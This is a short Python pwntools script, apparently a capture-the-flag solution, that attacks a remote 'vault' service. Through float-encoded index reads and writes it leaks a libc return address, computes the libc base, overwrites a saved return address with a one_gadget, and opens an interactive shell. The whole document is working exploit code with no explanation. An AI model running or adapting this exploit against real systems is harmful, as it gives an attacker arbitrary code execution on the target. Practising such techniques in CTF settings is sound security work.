from pwn import *
import struct

offset___libc_start_main_ret = 0x18637
offset_one_gadget = 0x3ac5e

def floatToInt(value):
    val = struct.unpack('I', struct.pack('f', value))[0]
    return val

def intToFloat(value):
    hx = hex(value)   
    return struct.unpack("f", struct.pack("I", int(hx, 16)))[0]

debug = 0

if (debug):
	p = process("./vault")
else:
	p = remote("3.1.85.51", "10003")


def tulis(idx, val):
	p.recvuntil(">")
	p.sendline("2")
	p.recvuntil(":")
	p.sendline(str(idx))
	p.recvuntil(":")
	p.sendline(str(intToFloat(val)))

def baca(idx):
	p.recvuntil(">")
	p.sendline("1")
	p.recvuntil(":")
	p.sendline(str(idx))
	p.recvuntil(":")
	data = p.recvuntil("\n")
	return floatToInt(float(data.strip()))

idx_token = 22
idx_ret = 26
idx_libc = 30

tulis(idx_token, 3)
libc_base = baca(idx_libc)-offset___libc_start_main_ret
tulis(idx_ret, libc_base+offset_one_gadget)

p.interactive()